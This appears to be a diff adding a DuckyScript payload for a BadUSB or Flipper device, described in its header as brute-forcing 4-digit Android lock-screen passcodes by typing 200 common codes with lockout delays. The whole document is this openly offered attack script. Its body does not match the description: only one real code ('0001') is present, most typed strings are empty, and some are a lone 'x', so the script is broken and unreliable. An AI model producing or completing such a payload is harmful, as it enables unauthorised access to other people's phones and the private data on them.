@@ -1,0 +1,42 @@
+REM author: Hacksaw (hack5aw)
+REM Personal Repo: https://github.com/hack5aw/Ducky-Payloads & https://github.com/hack5aw/Flipper-collection
+REM Title: Android Bruteforcing Payload
+REM Description: Instead of other payloads that only do 65 this does 200 of the most used passcodes. (Note:Only works for 4 digit passcodes)
+DELAY 450  
+STRING
+ENTER
+DELAY 450
+STRING 0001
+ENTER
+DELAY 450
+STRING 
+ENTER
+DELAY 450
+STRING 
+ENTER
+DELAY 450
+STRING 
+ENTER
+DELAY 450
+STRING x
+ENTER
+DELAY 30500
+DELAY 450
+STRING 
+ENTER
+DELAY 450
+STRING 
+ENTER
+DELAY 450
+STRING 
+ENTER
+DELAY 450
+STRING 
+ENTER
+DELAY 450
+STRING 
+ENTER
+DELAY 450
+STRING x
+ENTER
+DELAY 30500
